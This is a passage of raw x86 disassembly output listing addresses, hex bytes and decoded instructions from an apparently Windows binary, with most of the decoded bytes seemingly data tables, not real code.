  406911:	00 96 05 00 00 01    	add    %dl,0x1000005(%esi)
  406917:	00 ce                	add    %cl,%dh
  406919:	07                   	pop    %es
  40691a:	00 00                	add    %al,(%eax)
  40691c:	01 00                	add    %eax,(%eax)
  40691e:	fa                   	cli
  40691f:	07                   	pop    %es
  406920:	00 00                	add    %al,(%eax)
  406922:	02 00                	add    (%eax),%al
  406924:	b5 03                	mov    $0x3,%ch
  406926:	00 00                	add    %al,(%eax)
  406928:	01 00                	add    %eax,(%eax)
  40692a:	7a 02                	jp     0x40692e
  40692c:	00 00                	add    %al,(%eax)
  40692e:	01 00                	add    %eax,(%eax)
  406930:	af                   	scas   %es:(%edi),%eax
  406931:	23 00                	and    (%eax),%eax
  406933:	00 02                	add    %al,(%edx)
  406935:	00 d6                	add    %dl,%dh
  406937:	02 00                	add    (%eax),%al
  406939:	00 01                	add    %al,(%ecx)
  40693b:	00 62 05             	add    %ah,0x5(%edx)
  40693e:	00 00                	add    %al,(%eax)
  406940:	01 00                	add    %eax,(%eax)
  406942:	81 03 00 00 02 00    	addl   $0x20000,(%ebx)
  406948:	16                   	push   %ss
  406949:	01 00                	add    %eax,(%eax)
  40694b:	00 01                	add    %al,(%ecx)
  40694d:	00 0f                	add    %cl,(%edi)
  40694f:	0d 00 00 02 00       	or     $0x20000,%eax
  406954:	ec                   	in     (%dx),%al
  406955:	01 00                	add    %eax,(%eax)
  406957:	00 01                	add    %al,(%ecx)
  406959:	00 9d 18 00 00 02    	add    %bl,0x2000018(%ebp)
  40695f:	00 63 15             	add    %ah,0x15(%ebx)
  406962:	00 00                	add    %al,(%eax)
  406964:	01 00                	add    %eax,(%eax)
  406966:	bf 08 00 00 02       	mov    $0x2000008,%edi
  40696b:	00 2b                	add    %ch,(%ebx)
  40696d:	0d 00 00 01 00       	or     $0x10000,%eax
  406972:	27                   	daa
  406973:	01 00                	add    %eax,(%eax)
  406975:	00 02                	add    %al,(%edx)
  406977:	00 f4                	add    %dh,%ah
  406979:	12 00                	adc    (%eax),%al
  40697b:	00 01                	add    %al,(%ecx)
  40697d:	00 9d 15 00 00 02    	add    %bl,0x2000015(%ebp)
  406983:	00 e8                	add    %ch,%al
  406985:	12 00                	adc    (%eax),%al
  406987:	00 01                	add    %al,(%ecx)
  406989:	00 aa 18 00 00 02    	add    %ch,0x2000018(%edx)
  40698f:	00 0b                	add    %cl,(%ebx)
  406991:	06                   	push   %es
  406992:	00 00                	add    %al,(%eax)
  406994:	01 00                	add    %eax,(%eax)
  406996:	2c 05                	sub    $0x5,%al
  406998:	00 00                	add    %al,(%eax)
  40699a:	01 00                	add    %eax,(%eax)
  40699c:	e2 25                	loop   0x4069c3
  40699e:	00 00                	add    %al,(%eax)
  4069a0:	02 00                	add    (%eax),%al
  4069a2:	9c                   	pushf
  4069a3:	25 00 00 01 00       	and    $0x10000,%eax
  4069a8:	71 09                	jno    0x4069b3
  4069aa:	00 00                	add    %al,(%eax)
  4069ac:	01 00                	add    %eax,(%eax)
  4069ae:	50                   	push   %eax
  4069af:	02 00                	add    (%eax),%al
  4069b1:	00 01                	add    %al,(%ecx)
  4069b3:	00 58 18             	add    %bl,0x18(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	01 00                	add    %eax,(%eax)
  4069ba:	2c 16                	sub    $0x16,%al
  4069bc:	00 00                	add    %al,(%eax)
  4069be:	01 00                	add    %eax,(%eax)
  4069c0:	87 05 00 00 02 00    	xchg   %eax,0x20000
  4069c6:	56                   	push   %esi
  4069c7:	01 00                	add    %eax,(%eax)
  4069c9:	00 01                	add    %al,(%ecx)
  4069cb:	00 e1                	add    %ah,%cl
  4069cd:	1d 00 00 02 00       	sbb    $0x20000,%eax
  4069d2:	7b 05                	jnp    0x4069d9
  4069d4:	00 00                	add    %al,(%eax)
  4069d6:	03 00                	add    (%eax),%eax
  4069d8:	4d                   	dec    %ebp
  4069d9:	06                   	push   %es
  4069da:	00 00                	add    %al,(%eax)
  4069dc:	01 00                	add    %eax,(%eax)
  4069de:	e9 04 00 00 02       	jmp    0x24069e7
  4069e3:	00 ea                	add    %ch,%dl
  4069e5:	1f                   	pop    %ds
  4069e6:	00 00                	add    %al,(%eax)
  4069e8:	01 00                	add    %eax,(%eax)
  4069ea:	21 02                	and    %eax,(%edx)
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	01 00                	add    %eax,(%eax)
  4069f0:	3b 16                	cmp    (%esi),%edx
  4069f2:	00 00                	add    %al,(%eax)
  4069f4:	01 00                	add    %eax,(%eax)
  4069f6:	f1                   	int1
  4069f7:	14 00                	adc    $0x0,%al
  4069f9:	00 01                	add    %al,(%ecx)
  4069fb:	00 85 02 00 00 01    	add    %al,0x1000002(%ebp)
  406a01:	00 56 0a             	add    %dl,0xa(%esi)
  406a04:	00 00                	add    %al,(%eax)
  406a06:	01 00                	add    %eax,(%eax)
  406a08:	3b 12                	cmp    (%edx),%edx
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	01 00                	add    %eax,(%eax)
  406a0e:	11 18                	adc    %ebx,(%eax)
  406a10:	00 00                	add    %al,(%eax)
  406a12:	01 00                	add    %eax,(%eax)
  406a14:	01 24 00             	add    %esp,(%eax,%eax,1)
  406a17:	00 01                	add    %al,(%ecx)
  406a19:	00 f8                	add    %bh,%al
  406a1b:	03 00                	add    (%eax),%eax
  406a1d:	00 01                	add    %al,(%ecx)
  406a1f:	00 ba 09 00 00 01    	add    %bh,0x1000009(%edx)
  406a25:	00 ab 0b 00 00 02    	add    %ch,0x200000b(%ebx)
  406a2b:	00 96 07 00 00 01    	add    %dl,0x1000007(%esi)
  406a31:	00 8a 04 00 00 01    	add    %cl,0x1000004(%edx)
  406a37:	00 f1                	add    %dh,%cl
  406a39:	00 00                	add    %al,(%eax)
  406a3b:	00 01                	add    %al,(%ecx)
  406a3d:	00 c2                	add    %al,%dl
  406a3f:	24 00                	and    $0x0,%al
  406a41:	00 01                	add    %al,(%ecx)
  406a43:	00 65 09             	add    %ah,0x9(%ebp)
  406a46:	06                   	push   %es
  406a47:	00 2d 00 08 00 35    	add    %ch,0x35000800
  406a4d:	00 59 00             	add    %bl,0x0(%ecx)
  406a50:	6e                   	outsb  %ds:(%esi),(%dx)
  406a51:	22 04 01             	and    (%ecx,%eax,1),%al
  406a54:	59                   	pop    %ecx
  406a55:	00 49 23             	add    %cl,0x23(%ecx)
  406a58:	08 01                	or     %al,(%ecx)
  406a5a:	59                   	pop    %ecx
  406a5b:	00 85 21 0e 00 69    	add    %al,0x69000e21(%ebp)
  406a61:	00 62 1d             	add    %ah,0x1d(%edx)
  406a64:	b2 01                	mov    $0x1,%dl
  406a66:	c9                   	leave
  406a67:	00 7a 1d             	add    %bh,0x1d(%edx)
  406a6a:	fa                   	cli
  406a6b:	02 d1                	add    %cl,%dl
  406a6d:	00 7a 1d             	add    %bh,0x1d(%edx)
  406a70:	0e                   	push   %cs
  406a71:	00 d9                	add    %bl,%cl
  406a73:	00 7a 1d             	add    %bh,0x1d(%edx)
  406a76:	27                   	daa
  406a77:	03 e9                	add    %ecx,%ebp
  406a79:	00 7a 1d             	add    %bh,0x1d(%edx)
  406a7c:	53                   	push   %ebx
  406a7d:	01 f1                	add    %esi,%ecx
  406a7f:	00 7a 1d             	add    %bh,0x1d(%edx)
  406a82:	53                   	push   %ebx
  406a83:	01 f9                	add    %edi,%ecx
  406a85:	00 7a 1d             	add    %bh,0x1d(%edx)
  406a88:	53                   	push   %ebx
  406a89:	01 01                	add    %eax,(%ecx)
  406a8b:	01 7a 1d             	add    %edi,0x1d(%edx)
  406a8e:	53                   	push   %ebx
  406a8f:	01 09                	add    %ecx,(%ecx)
  406a91:	01 7a 1d             	add    %edi,0x1d(%edx)
  406a94:	53                   	push   %ebx
  406a95:	01 11                	add    %edx,(%ecx)
  406a97:	01 7a 1d             	add    %edi,0x1d(%edx)
  406a9a:	53                   	push   %ebx
  406a9b:	01 19                	add    %ebx,(%ecx)
  406a9d:	01 7a 1d             	add    %edi,0x1d(%edx)
  406aa0:	53                   	push   %ebx
  406aa1:	01 21                	add    %esp,(%ecx)
  406aa3:	01 7a 1d             	add    %edi,0x1d(%edx)
  406aa6:	99                   	cltd
  406aa7:	01 29                	add    %ebp,(%ecx)
  406aa9:	01 7a 1d             	add    %edi,0x1d(%edx)
  406aac:	53                   	push   %ebx
  406aad:	01 31                	add    %esi,(%ecx)
  406aaf:	01 7a 1d             	add    %edi,0x1d(%edx)
  406ab2:	53                   	push   %ebx
  406ab3:	01 39                	add    %edi,(%ecx)
  406ab5:	01 7a 1d             	add    %edi,0x1d(%edx)
  406ab8:	0e                   	push   %cs
  406ab9:	00 41 01             	add    %al,0x1(%ecx)
  406abc:	7a 1d                	jp     0x406adb
  406abe:	53                   	push   %ebx
  406abf:	01 49 01             	add    %ecx,0x1(%ecx)
  406ac2:	30 1b                	xor    %bl,(%ebx)
  406ac4:	7f 00                	jg     0x406ac6
  406ac6:	51                   	push   %ecx
  406ac7:	01 44 00 bd          	add    %eax,-0x43(%eax,%eax,1)
  406acb:	03 59 01             	add    0x1(%ecx),%ebx
  406ace:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406acf:	21 7f 00             	and    %edi,0x0(%edi)
  406ad2:	51                   	push   %ecx
  406ad3:	01 b8 18 84 00 61    	add    %edi,0x61008418(%eax)
  406ad9:	01 7a 1d             	add    %edi,0x1d(%edx)
  406adc:	0e                   	push   %cs
  406add:	00 61 01             	add    %ah,0x1(%ecx)
  406ae0:	4d                   	dec    %ebp
  406ae1:	23 c2                	and    %edx,%eax
  406ae3:	03 09                	add    (%ecx),%ecx
  406ae5:	00 7a 1d             	add    %bh,0x1d(%edx)
  406ae8:	0e                   	push   %cs
  406ae9:	00 69 01             	add    %ch,0x1(%ecx)
  406aec:	8a 00                	mov    (%eax),%al
  406aee:	cc                   	int3
  406aef:	03 51 01             	add    0x1(%ecx),%edx
  406af2:	ca 13 c7             	lret   $0xc713
  406af5:	00 69 01             	add    %ch,0x1(%ecx)
  406af8:	1c 14                	sbb    $0x14,%al
  406afa:	d2 03                	rolb   %cl,(%ebx)
  406afc:	11 00                	adc    %eax,(%eax)
  406afe:	7a 1d                	jp     0x406b1d
  406b00:	79 01                	jns    0x406b03
  406b02:	11 00                	adc    %eax,(%eax)
  406b04:	65 25 d8 03 71 01    	gs and $0x17103d8,%eax
  406b0a:	3d 25 de 03 69       	cmp    $0x6903de25,%eax
  406b0f:	01 05 1f e4 03 89    	add    %eax,0x8903e41f
  406b15:	01 fb                	add    %edi,%ebx
  406b17:	01 6b 02             	add    %ebp,0x2(%ebx)
  406b1a:	81 01 84 14 ea 03    	addl   $0x3ea1484,(%ecx)
  406b20:	19 00                	sbb    %eax,(%eax)
  406b22:	7a 1d                	jp     0x406b41
  406b24:	08 04 19             	or     %al,(%ecx,%ebx,1)
  406b27:	00 95 12 fa 02 19    	add    %dl,0x1902fa12(%ebp)
  406b2d:	00 82 12 fa 02 c9    	add    %al,-0x36fd05ee(%edx)
  406b33:	01 17                	add    %edx,(%edi)
  406b35:	26 a5                	movsl  %es:(%esi),%es:(%edi)
  406b37:	02 c9                	add    %cl,%cl
  406b39:	01 a1 21 15 04 61    	add    %esp,0x61041521(%ecx)
  406b3f:	01 4d 23             	add    %ecx,0x23(%ebp)
  406b42:	1c 04                	sbb    $0x4,%al
  406b44:	d9 01                	flds   (%ecx)
  406b46:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406b47:	1e                   	push   %ds
  406b48:	21 04 19             	and    %eax,(%ecx,%ebx,1)
  406b4b:	00 41 21             	add    %al,0x21(%ecx)
  406b4e:	29 04 19             	sub    %eax,(%ecx,%ebx,1)
  406b51:	00 7d 0b             	add    %bh,0xb(%ebp)
  406b54:	08 01                	or     %al,(%ecx)
  406b56:	19 00                	sbb    %eax,(%eax)
  406b58:	41                   	inc    %ecx
  406b59:	21 8a 01 a1 01 7a    	and    %ecx,0x7a01a101(%edx)
  406b5f:	1d 0e 00 a9 01       	sbb    $0x1a9000e,%eax
  406b64:	7a 1d                	jp     0x406b83
  406b66:	84 01                	test   %al,(%ecx)
  406b68:	a1 01 7e 1f 31       	mov    0x311f7e01,%eax
  406b6d:	04 a1                	add    $0xa1,%al
  406b6f:	01 ea                	add    %ebp,%edx
  406b71:	13 de                	adc    %esi,%ebx
  406b73:	02 c9                	add    %cl,%cl
  406b75:	01 a1 21 38 04 f1    	add    %esp,-0xefbc7df(%ecx)
  406b7b:	01 d2                	add    %edx,%edx
  406b7d:	0f 0e                	femms
  406b7f:	00 f9                	add    %bh,%cl
  406b81:	01 7a 1d             	add    %edi,0x1d(%edx)
  406b84:	42                   	inc    %edx
  406b85:	04 01                	add    $0x1,%al
  406b87:	02 7a 1d             	add    0x1d(%edx),%bh
  406b8a:	49                   	dec    %ecx
  406b8b:	04 21                	add    $0x21,%al
  406b8d:	00 7a 1d             	add    %bh,0x1d(%edx)
  406b90:	4f                   	dec    %edi
  406b91:	04 19                	add    $0x19,%al
  406b93:	00 a0 22 59 04 09    	add    %ah,0x9045922(%eax)
  406b99:	00 f9                	add    %bh,%cl
  406b9b:	13 95 01 21 00 1c    	adc    0x1c002101(%ebp),%edx
  406ba1:	22 5f 04             	and    0x4(%edi),%bl
  406ba4:	29 02                	sub    %eax,(%edx)
  406ba6:	7a 1d                	jp     0x406bc5
  406ba8:	49                   	dec    %ecx
  406ba9:	04 29                	add    $0x29,%al
  406bab:	00 7a 1d             	add    %bh,0x1d(%edx)
  406bae:	6b 04 31 02          	imul   $0x2,(%ecx,%esi,1),%eax
  406bb2:	7a 1d                	jp     0x406bd1
  406bb4:	49                   	dec    %ecx
  406bb5:	04 71                	add    $0x71,%al
  406bb7:	00 55 0b             	add    %dl,0xb(%ebp)
  406bba:	75 04                	jne    0x406bc0
  406bbc:	39 02                	cmp    %eax,(%edx)
  406bbe:	2d 0f 82 04 31       	sub    $0x3104820f,%eax
  406bc3:	00 8e 1f 89 04 29    	add    %cl,0x2904891f(%esi)
  406bc9:	00 d2                	add    %dl,%dl
  406bcb:	0f 0e                	femms
  406bcd:	00 71 00             	add    %dh,0x0(%ecx)
  406bd0:	d2 0f                	rorb   %cl,(%edi)
  406bd2:	0e                   	push   %cs
  406bd3:	00 19                	add    %bl,(%ecx)
  406bd5:	00 d2                	add    %dl,%dl
  406bd7:	0f 0e                	femms
  406bd9:	00 71 00             	add    %dh,0x0(%ecx)
  406bdc:	4d                   	dec    %ebp
  406bdd:	0b 94 04 49 02 44 00 	or     0x440249(%esp,%eax,1),%edx
  406be4:	9a 04 71 00 5a 0b a1 	lcall  $0xa10b,$0x5a007104
  406beb:	04 51                	add    $0x51,%al
  406bed:	02 7a 1d             	add    0x1d(%edx),%bh
  406bf0:	49                   	dec    %ecx
  406bf1:	04 49                	add    $0x49,%al
  406bf3:	01 7a 1d             	add    %edi,0x1d(%edx)
  406bf6:	a9 04 49 01 fb       	test   $0xfb014904,%eax
  406bfb:	22 b0 04 61 02 f6    	and    -0x9fd9efc(%eax),%dh
  406c01:	1c c2                	sbb    $0xc2,%al
  406c03:	04 49                	add    $0x49,%al
  406c05:	02 05 1f e0 00 19    	add    0x1900e01f,%al
  406c0b:	00 08                	add    %cl,(%eax)
  406c0d:	17                   	pop    %ss
  406c0e:	c9                   	leave
  406c0f:	04 71                	add    $0x71,%al
  406c11:	00 38                	add    %bh,(%eax)
  406c13:	10 d1                	adc    %dl,%cl
  406c15:	04 59                	add    $0x59,%al
  406c17:	02 7a 1d             	add    0x1d(%edx),%bh
  406c1a:	79 01                	jns    0x406c1d
  406c1c:	71 00                	jno    0x406c1e
  406c1e:	b1 19                	mov    $0x19,%cl
  406c20:	63 01                	arpl   %eax,(%ecx)
  406c22:	71 00                	jno    0x406c24
  406c24:	8f                   	(bad)
  406c25:	14 0e                	adc    $0xe,%al
  406c27:	00 61 02             	add    %ah,0x2(%ecx)
  406c2a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406c2b:	21 9a 00 c9 01 f9    	and    %ebx,-0x6fe3700(%edx)
  406c31:	20 d9                	and    %bl,%cl
  406c33:	04 71                	add    $0x71,%al
  406c35:	02 39                	add    (%ecx),%bh
  406c37:	21 0a                	and    %ecx,(%edx)
  406c39:	00 79 02             	add    %bh,0x2(%ecx)
  406c3c:	7a 1d                	jp     0x406c5b
  406c3e:	0e                   	push   %cs
  406c3f:	00 c9                	add    %cl,%cl
  406c41:	01 05 21 e9 04 79    	add    %eax,0x7904e921
  406c47:	02 ca                	add    %dl,%cl
  406c49:	0c ef                	or     $0xef,%al
  406c4b:	04 49                	add    $0x49,%al
  406c4d:	02 05 1f da 00 49    	add    0x4900da1f,%al
  406c53:	02 05 1f ec 00 51    	add    0x5100ec1f,%al
  406c59:	00 7a 1d             	add    %bh,0x1d(%edx)
  406c5c:	0e                   	push   %cs
  406c5d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c60:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406c61:	17                   	pop    %ss
  406c62:	04 05                	add    $0x5,%al
  406c64:	0c 00                	or     $0x0,%al
  406c66:	b3 22                	mov    $0x22,%bl
  406c68:	3d 01 c9 01 09       	cmp    $0x901c901,%eax
  406c6d:	1d 95 01 0c 00       	sbb    $0xc0195,%eax
  406c72:	c0 1b 0e             	rcrb   $0xe,(%ebx)
  406c75:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c78:	6b 0b 0f             	imul   $0xf,(%ebx),%ecx
  406c7b:	05 0c 00 62 1d       	add    $0x1d62000c,%eax
  406c80:	24 05                	and    $0x5,%al
  406c82:	14 00                	adc    $0x0,%al
  406c84:	6e                   	outsb  %ds:(%esi),(%dx)
  406c85:	22 36                	and    (%esi),%dh
  406c87:	05 c9 01 8e 1f       	add    $0x1f8e01c9,%eax
  406c8c:	90                   	nop
  406c8d:	01 14 00             	add    %edx,(%eax,%eax,1)
  406c90:	49                   	dec    %ecx
  406c91:	23 08                	and    (%eax),%ecx
  406c93:	01 71 00             	add    %esi,0x0(%ecx)
  406c96:	e4 11                	in     $0x11,%al
  406c98:	43                   	inc    %ebx
  406c99:	05 49 02 05 1f       	add    $0x1f050249,%eax
  406c9e:	e6 00                	out    %al,$0x0
  406ca0:	51                   	push   %ecx
  406ca1:	01 5d 00             	add    %ebx,0x0(%ebp)
  406ca4:	4d                   	dec    %ebp
  406ca5:	05 c9 01 0c 18       	add    $0x180c01c9,%eax
  406caa:	95                   	xchg   %eax,%ebp
  406cab:	01 91 02 da 0f 52    	add    %edx,0x520fda02(%ecx)
  406cb1:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cb6:	57                   	push   %edi
  406cb7:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cbc:	5c                   	pop    %esp
  406cbd:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cc2:	61                   	popa
  406cc3:	05 51 01 66 00       	add    $0x660151,%eax
  406cc8:	68 05 89 02 da       	push   $0xda028905
  406ccd:	0f 6d                	(bad)
  406ccf:	05 51 01 66 00       	add    $0x660151,%eax
  406cd4:	72 05                	jb     0x406cdb
  406cd6:	51                   	push   %ecx
  406cd7:	01 66 00             	add    %esp,0x0(%esi)
  406cda:	77 05                	ja     0x406ce1
  406cdc:	51                   	push   %ecx
  406cdd:	01 66 00             	add    %esp,0x0(%esi)
  406ce0:	7c 05                	jl     0x406ce7
  406ce2:	51                   	push   %ecx
  406ce3:	01 ee                	add    %ebp,%esi
  406ce5:	0d 83 05 99 02       	or     $0x2990583,%eax
  406cea:	da 0f                	fimull (%edi)
  406cec:	88 05 49 02 05 1f    	mov    %al,0x1f050249
  406cf2:	95                   	xchg   %eax,%ebp
  406cf3:	05 a9 02 ca 25       	add    $0x25ca02a9,%eax
  406cf8:	71 01                	jno    0x406cfb
  406cfa:	b9 02 8e 20 84       	mov    $0x84208e02,%ecx
  406cff:	00 b1 02 7a 1d a6    	add    %dh,-0x59e285fe(%ecx)
  406d05:	05 71 00 b4 14       	add    $0x14b40071,%eax
  406d0a:	71 01                	jno    0x406d0d
  406d0c:	71 00                	jno    0x406d0e
  406d0e:	cc                   	int3
  406d0f:	0f 0e                	femms
  406d11:	00 b1 02 7a 1d b4    	add    %dh,-0x4be285fe(%ecx)
  406d17:	05 d9 02 19 25       	add    $0x251902d9,%eax
  406d1c:	c8 05 59 02          	enter  $0x5905,$0x2
  406d20:	7a 1d                	jp     0x406d3f
  406d22:	0e                   	push   %cs
  406d23:	00 71 00             	add    %dh,0x0(%ecx)
  406d26:	db 11                	fistl  (%ecx)
  406d28:	3d 01 91 01 7a       	cmp    $0x7a019101,%eax
  406d2d:	1d 53 01 49 02       	sbb    $0x2490153,%eax
  406d32:	6e                   	outsb  %ds:(%esi),(%dx)
  406d33:	00 de                	add    %bl,%dh
  406d35:	05 49 02 54 0e       	add    $0xe540249,%eax
  406d3a:	e5 05                	in     $0x5,%eax
  406d3c:	49                   	dec    %ecx
  406d3d:	02 ee                	add    %dh,%ch
  406d3f:	0d ec 05 49 02       	or     $0x24905ec,%eax
  406d44:	3b 00                	cmp    (%eax),%eax
  406d46:	f3 05 49 02 5d 00    	repz add $0x5d0249,%eax
  406d4c:	fa                   	cli
  406d4d:	05 49 02 77 00       	add    $0x770249,%eax
  406d52:	01 06                	add    %eax,(%esi)
  406d54:	49                   	dec    %ecx
  406d55:	02 66 00             	add    0x0(%esi),%ah
  406d58:	08 06                	or     %al,(%esi)
  406d5a:	0c 00                	or     $0x0,%al
  406d5c:	7a 1d                	jp     0x406d7b
  406d5e:	0e                   	push   %cs
  406d5f:	00 49 02             	add    %cl,0x2(%ecx)
  406d62:	05 1f 3a 06 59       	add    $0x59063a1f,%eax
  406d67:	01 7e 1e             	add    %edi,0x1e(%esi)
  406d6a:	6b 02 19             	imul   $0x19,(%edx),%eax
  406d6d:	03 70 0f             	add    0xf(%eax),%esi
  406d70:	d9 04 f9             	flds   (%ecx,%edi,8)
  406d73:	02 7a 1d             	add    0x1d(%edx),%bh
  406d76:	53                   	push   %ebx
  406d77:	01 81 00 44 20 5d    	add    %eax,0x5d204400(%ecx)
  406d7d:	06                   	push   %es
  406d7e:	81 00 7e 0e 62 06    	addl   $0x6620e7e,(%eax)
  406d84:	21 03                	and    %eax,(%ebx)
  406d86:	be 0e 95 01 29       	mov    $0x2901950e,%esi
  406d8b:	03 13                	add    (%ebx),%edx
  406d8d:	0f 95 01             	setne  (%ecx)
  406d90:	c9                   	leave
  406d91:	01 23                	add    %esp,(%ebx)
  406d93:	26 a5                	movsl  %es:(%esi),%es:(%edi)
  406d95:	02 81 00 99 1e 68    	add    0x681e9900(%ecx),%al
  406d9b:	06                   	push   %es
  406d9c:	81 00 03 17 0e 00    	addl   $0xe1703,(%eax)
  406da2:	81 00 7a 1d 0e 00    	addl   $0xe1d7a,(%eax)
  406da8:	01 03                	add    %eax,(%ebx)
  406daa:	7a 1d                	jp     0x406dc9
  406dac:	0e                   	push   %cs
  406dad:	00 01                	add    %al,(%ecx)
  406daf:	03 cb                	add    %ebx,%ecx
  406db1:	0e                   	push   %cs
  406db2:	53                   	push   %ebx
  406db3:	01 19                	add    %ebx,(%ecx)
  406db5:	03 ff                	add    %edi,%edi
  406db7:	18 6b 02             	sbb    %ch,0x2(%ebx)
  406dba:	c9                   	leave
  406dbb:	01 f9                	add    %edi,%ecx
  406dbd:	20 6e 06             	and    %ch,0x6(%esi)
  406dc0:	01 03                	add    %eax,(%ebx)
  406dc2:	73 20                	jae    0x406de4
  406dc4:	53                   	push   %ebx
  406dc5:	01 01                	add    %eax,(%ecx)
  406dc7:	03 9b 0e 74 06 01    	add    0x106740e(%ebx),%ebx
  406dcd:	03 89 24 99 01 81    	add    -0x7efe66dc(%ecx),%ecx
  406dd3:	00 b0 1a 7b 06 81    	add    %dh,-0x7ef984e6(%eax)
  406dd9:	00 fb                	add    %bh,%bl
  406ddb:	22 08                	and    (%eax),%cl
  406ddd:	01 39                	add    %edi,(%ecx)
  406ddf:	03 d2                	add    %edx,%edx
  406de1:	1c 82                	sbb    $0x82,%al
  406de3:	06                   	push   %es
  406de4:	41                   	inc    %ecx
  406de5:	03 e0                	add    %eax,%esp
  406de7:	0f 6b 02             	packssdw (%edx),%mm0
  406dea:	09 03                	or     %eax,(%ebx)
  406dec:	5a                   	pop    %edx
  406ded:	25 87 06 c9 01       	and    $0x1c90687,%eax
  406df2:	f9                   	stc
  406df3:	20 91 06 09 03 03    	and    %dl,0x3030906(%ecx)
  406df9:	12 98 06 b9 02 28    	adc    0x2802b906(%eax),%bl
  406dff:	10 b1 02 b9 02 f8    	adc    %dh,-0x7fd46fe(%ecx)
  406e05:	1e                   	push   %ds
  406e06:	c7 00 61 01 0e 1f    	movl   $0x1f0e0161,(%eax)
  406e0c:	79 01                	jns    0x406e0f
  406e0e:	19 03                	sbb    %eax,(%ebx)
  406e10:	d8 0e                	fmuls  (%esi)
  406e12:	67 02 11             	add    (%bx,%di),%dl
  406e15:	03 7a 1d             	add    0x1d(%edx),%edi
  406e18:	53                   	push   %ebx
  406e19:	01 51 03             	add    %edx,0x3(%ecx)
  406e1c:	66 0f 53             	(bad)
  406e1f:	01 19                	add    %ebx,(%ecx)
  406e21:	03 a8 14 67 02 19    	add    0x19026714(%eax),%ebp
  406e27:	03 e8                	add    %eax,%ebp
  406e29:	0e                   	push   %cs
  406e2a:	6b 02 01             	imul   $0x1,(%edx),%eax
  406e2d:	03 4d 14             	add    0x14(%ebp),%ecx
  406e30:	99                   	cltd
  406e31:	01 01                	add    %eax,(%ecx)
  406e33:	03 c7                	add    %edi,%eax
  406e35:	11 99 01 81 00 fb    	adc    %ebx,-0x4ff7eff(%ecx)
  406e3b:	22 9e 06 59 01 1a    	and    0x1a015906(%esi),%bl
  406e41:	23 b1 02 59 01 ee    	and    -0x11fea6fe(%ecx),%esi
  406e47:	25 67 02 19 03       	and    $0x3190267,%eax
  406e4c:	d0 22                	shlb   $1,(%edx)
  406e4e:	6b 02 59             	imul   $0x59,(%edx),%eax
  406e51:	03 7a 1d             	add    0x1d(%edx),%edi
  406e54:	53                   	push   %ebx
  406e55:	01 59 03             	add    %ebx,0x3(%ecx)
  406e58:	56                   	push   %esi
  406e59:	12 71 01             	adc    0x1(%ecx),%dh
  406e5c:	61                   	popa
  406e5d:	03 7a 1d             	add    0x1d(%edx),%edi
  406e60:	0e                   	push   %cs
  406e61:	00 61 03             	add    %ah,0x3(%ecx)
  406e64:	04 0f                	add    $0xf,%al
  406e66:	95                   	xchg   %eax,%ebp
  406e67:	01 c9                	add    %ecx,%ecx
  406e69:	01 bb 1f 90 01 69    	add    %edi,0x6901901f(%ebx)
  406e6f:	03 7a 1d             	add    0x1d(%edx),%edi
  406e72:	53                   	push   %ebx
  406e73:	01 69 03             	add    %ebp,0x3(%ecx)
  406e76:	49                   	dec    %ecx
  406e77:	21 bc 06 71 03 62 1d 	and    %edi,0x1d620371(%esi,%eax,1)
  406e7e:	c2 06 79             	ret    $0x7906
  406e81:	03 6e 22             	add    0x22(%esi),%ebp
  406e84:	c8 06 81 03          	enter  $0x8106,$0x3
  406e88:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e89:	17                   	pop    %ss
  406e8a:	ce                   	into
  406e8b:	06                   	push   %es
  406e8c:	c9                   	leave
  406e8d:	01 c9                	add    %ecx,%ecx
  406e8f:	21 95 01 79 03 49    	and    %edx,0x49037901(%ebp)
  406e95:	23 08                	and    (%eax),%ecx
  406e97:	01 81 00 f7 0d d8    	add    %eax,-0x27f20900(%ecx)
  406e9d:	06                   	push   %es
  406e9e:	89 03                	mov    %eax,(%ebx)
  406ea0:	44                   	inc    %esp
  406ea1:	00 3d 01 81 00 10    	add    %bh,0x10008101
  406ea7:	0b 3d 01 91 03 f9    	or     0xf9039101,%edi
  406ead:	13 95 01 99 03 15    	adc    0x15039901(%ebp),%edx
  406eb3:	23 f6                	and    %esi,%esi
  406eb5:	06                   	push   %es
  406eb6:	99                   	cltd
  406eb7:	03 ac 21 09 07 59 01 	add    0x1590709(%ecx,%eiz,1),%ebp
  406ebe:	bd 22 7b 00 59       	mov    $0x59007b22,%ebp
  406ec3:	01 20                	add    %esp,(%eax)
  406ec5:	0f 67 02             	packuswb (%edx),%mm0
  406ec8:	59                   	pop    %ecx
  406ec9:	01 f4                	add    %esi,%esp
  406ecb:	0e                   	push   %cs
  406ecc:	67 02 59 01          	add    0x1(%bx,%di),%bl
  406ed0:	1b 19                	sbb    (%ecx),%ebx
  406ed2:	1a 07                	sbb    (%edi),%al
  406ed4:	c9                   	leave
  406ed5:	01 f9                	add    %edi,%ecx
  406ed7:	20 20                	and    %ah,(%eax)
  406ed9:	07                   	pop    %es
  406eda:	b1 03                	mov    $0x3,%cl
  406edc:	7a 1d                	jp     0x406efb
  406ede:	0e                   	push   %cs
  406edf:	00 69 01             	add    %ch,0x1(%ecx)
  406ee2:	e0 03                	loopne 0x406ee7
  406ee4:	cc                   	int3
  406ee5:	03 b9 03 78 14 e3    	add    -0x1ceb87fd(%ecx),%edi
  406eeb:	02 21                	add    (%ecx),%ah
  406eed:	02 f9                	add    %cl,%bh
  406eef:	13 de                	adc    %esi,%ebx
  406ef1:	02 c9                	add    %cl,%cl
  406ef3:	01 26                	add    %esp,(%esi)
  406ef5:	14 32                	adc    $0x32,%al
  406ef7:	07                   	pop    %es
  406ef8:	c9                   	leave
  406ef9:	01 ca                	add    %ecx,%edx
  406efb:	1c 95                	sbb    $0x95,%al
  406efd:	01 c9                	add    %ecx,%ecx
  406eff:	01 37                	add    %esi,(%edi)
  406f01:	0d 3f 07 59 01       	or     $0x159073f,%eax
